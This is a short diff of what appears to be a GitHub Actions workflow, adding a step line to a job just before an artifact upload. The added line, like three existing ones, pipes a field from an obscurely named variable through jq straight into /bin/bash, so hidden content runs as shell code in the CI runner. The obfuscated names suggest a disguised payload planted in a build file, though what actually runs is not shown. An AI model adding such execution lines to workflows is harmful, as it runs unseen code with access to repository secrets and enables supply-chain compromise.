@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$n96" | jq -r .pi0 | /bin/bash
           echo $rgmyd4 | jq -r .dkh49 | /bin/bash
           printf '%s' "$qkb596" | jq -r .igdl85019 | /bin/bash
+          echo $cxon11 | jq -r .qx76890 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
